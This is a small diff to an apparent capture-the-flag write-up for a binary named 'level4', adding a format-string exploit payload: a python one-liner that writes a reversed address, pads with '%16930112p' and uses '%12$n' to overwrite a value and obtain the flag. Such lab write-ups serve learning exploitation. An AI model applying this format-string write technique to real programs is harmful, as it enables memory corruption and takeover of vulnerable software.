@@ -8,6 +8,11 @@
 - looking like: address of m + 16millions (the int in cmp) spaces + the n formatting with the 12 bytes padding that we found before
 - get the flag
 
+Payload:
+```
+python -c 'print("\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n")' | ./level4
+```
+
 Extra context:
 https://chat.openai.com/share/672132c7-1d64-474e-af58-614fa751df16
 
